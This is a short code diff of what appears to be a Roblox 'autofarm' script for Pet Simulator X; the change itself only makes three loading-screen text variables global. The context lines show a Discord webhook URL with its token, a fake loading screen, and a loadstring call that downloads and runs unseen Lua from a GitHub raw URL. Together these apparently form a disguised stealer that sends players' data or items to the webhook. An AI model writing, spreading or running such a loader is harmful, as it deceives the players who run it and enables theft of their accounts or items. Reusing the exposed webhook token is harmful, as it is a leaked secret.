@@ -3,7 +3,7 @@ WebHook = "https://discord.com/api/webhooks/1094564008834646097/_I6TbpK6NMZZmIJ8
 loadingscreen = true
 CustomScriptName = "Yldrm Hub Autofarm"
 Text1 = "Script Loaded..."
-Text2 = "Waiting for Script..."
-Text3 = "Checking Scripts..."
-Text4 = "Starting Script..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
